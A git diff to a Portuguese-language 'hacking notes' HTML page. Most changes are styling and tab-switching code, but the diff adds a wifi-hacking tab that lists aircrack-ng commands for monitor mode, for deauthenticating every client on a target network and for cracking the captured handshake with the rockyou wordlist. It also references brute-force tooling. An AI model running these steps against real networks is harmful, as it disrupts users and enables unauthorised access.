@@ -12,6 +12,24 @@
             padding: 0;
             background-color: #000;
             color: #0F0;
+
+
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.2;
+            /* Opacidade da imagem (entre 0 e 1) */
+            filter: brightness(0.1);
+            /* Brilho da imagem (entre 0 e 1) */
+            z-index: -1;
         }
 
         header {
@@ -23,6 +41,7 @@
             font-size: 36px;
             color: #0F0;
             margin: 0;
+            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
         }
 
         main {
@@ -35,6 +54,7 @@
             font-size: 24px;
             color: #0F0;
             margin-bottom: 15px;
+            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
         }
 
         p {
@@ -45,6 +65,7 @@
         .highlight {
             background-color: #00FF00;
             padding: 5px;
+            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
         }
 
         ul,
@@ -62,6 +83,33 @@
             padding: 20px;
             font-size: 14px;
             color: #0F0;
+            text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000;
+        }
+
+        .tab {
+            display: none;
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .tab.active {
+            display: block;
+            opacity: 1;
+        }
+
+        .tab-button {
+            background-color: #333;
+            color: #0F0;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            text-shadow: -1px -1px 0 #000000;
+        }
+
+        .tab-button.active {
+            background-color: #0F0;
+            color: #000;
+            text-shadow: -1px -1px 0 #000000;
         }
 
         .tab {
@@ -71,33 +119,60 @@
         .tab.active {
             display: block;
         }
-
-        .tab-button {
-            background-color: #333;
-            color: #0F0;
-            padding: 10px;
-            border: none;
-            cursor: pointer;
-        }
-
-        .tab-button.active {
-            background-color: #0F0;
-            color: #000;
-        }
     </style>
 </head>
 
-<body>
+<body background="img/Cool wallpaper.jfif">
     <header>
-        <h1>[+] My hacking notes [+]</h1>
+        <h1>[+] azx hacking notes [+]</h1>
     </header>
 
     <main>
         <div class="tabs">
-            <button class="tab-button active" onclick="openTab(event, 'VULNERABILIDADES')">VARREDURA</button>
+            <button class="tab-button active" onclick="openTab(event, 'tab0')">Bem-vindo!</button>
+            <button class="tab-button" onclick="openTab(event, 'VULNERABILIDADES')">VARREDURA</button>
             <button class="tab-button" onclick="openTab(event, 'tab2')">PORT SCAN</button>
             <button class="tab-button" onclick="openTab(event, 'tab3')">ENUMERAÇÃO</button>
             <button class="tab-button" onclick="openTab(event, 'tab4')">BRUTE FORCE</button>
+            <button class="tab-button" onclick="openTab(event, 'tab5')">WIFI HACKING</button>
+        </div>
+
+        <div id="tab0" class="tab active">
+            <h2>Bem-vindo(a) </h2>
+            <p>Espero que ajude de alguma forma.</p>
+            <p>&nbsp;</p>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
+            <P>&nbsp;</P>
         </div>
 
         <div id="VULNERABILIDADES" class="tab active">
@@ -136,7 +211,7 @@
             <li> escaneia da porta 20 à 1024 </li>
         </div>
 
-        <div id="tab3" class="tab">
+        <div id="tab3" class="tab active">
             <h2>[*] ENUMERAÇÃO TOOLS [*]</h2>
             <p>Existem várias ferramentas disponíveis, como as seguintes:</p>
 
@@ -163,29 +238,54 @@
                 um arquivo contendo uma lista de senhas que você deseja testar e |alvo| pelo endereço IP ou nome
                 de domínio do servidor MySQL.</li>
         </div>
+
+        <div id="tab5" class="tab active">
+            <h2>[*] WIFI HACKING STEP BY STEP [*]</h2>
+            <h3> sudo apt update && apt upgrade -y </h3>
+            <p> Realiza a atualizaçao do sistema.</p>
+            <h3> iwconfig </h3>
+            <p> Verificaçao da placa de rede </p>
+            <h3> airmon-ng start wlan0 </h3>
+            <p> Realiza a ativaçao do modo monitor </p>
+            <h3>airodump-ng wlan0mon </h3>
+            <p>Faz a busca de redes proximas</p>
+            <p>obs:Caso queira capturar apenas a frequência 5G,
+                utilizar o comando: airodump-ng wlan0 -b a
+                (-b de banda e "a" da frequência 5.8ghz.)</p>
+            <h3>touch arquivo.txt</h3>
+            <p>Cria o local onde serao armazenados os dados coletados.</p>
+            <h3>airodump-ng --bssid |bssid alvo| --channel |número do canal| --write |nome do arquivo
+                onde os dados irão ser escritos| wlan0mon </h3>
+            <p>obs: o nome da placa de rede podera ser diferente no caso o exemplo mostra como wlan0mon</p>
+            <h3>aireplay-ng –deauth 0 -a bssid alvo wlan0mon </h3>
+            <p>Comando para realizar a desautenticaçao de todos conectados a rede alvo, em busca do handshak</p>
+            <h3>locate rockyou.txt</h3>
+            <p>agora localize o caminho da wordlist desejada (no exemplo sera usado uma padrao do kali)</p>
+            <h3>gzip -d /usr/share/wordlists/rockyou.txt.gz </h3>
+            <p>certifique-se que o arquivo esta descompactado, se nao o descompacte com este comando.</p>
+            <h3>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b bssid alvo arquivo .cap</h3>
+            <p>apos executar este comando o brute force sera inciado, agora é so aguardar e pronto.</p>
+            <p>obs: o "arquivo.cap" sera gerado apos vc escrever os dados no seu "arquivo.txt"</p>
+        </div>
     </main>
 
     <footer>
-        <p>[+] Lucas R. pentest Notes | site 2023. Todos os direitos reservados. [+]</p>
+        <p>[+] azx pentest Site | site 2023. Todos os direitos reservados. [+]</p>
     </footer>
 
     <script>
         function openTab(evt, tabName) {
-            // Obter todos os elementos com a classe "tab" e removê-la
-            const tabs = document.getElementsByClassName("tab");
-            for (let i = 0; i < tabs.length; i++) {
-                tabs[i].style.display = "none";
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tab");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
             }
-
-            // Obter todos os elementos com a classe "tab-button" e remover a classe "active"
-            const tabButtons = document.getElementsByClassName("tab-button");
-            for (let i = 0; i < tabButtons.length; i++) {
-                tabButtons[i].classList.remove("active");
+            tablinks = document.getElementsByClassName("tab-button");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
             }
-
-            // Exibir a aba selecionada e adicionar a classe "active" ao botão correspondente
             document.getElementById(tabName).style.display = "block";
-            evt.currentTarget.classList.add("active");
+            evt.currentTarget.className += " active";
         }
     </script>
 </body>
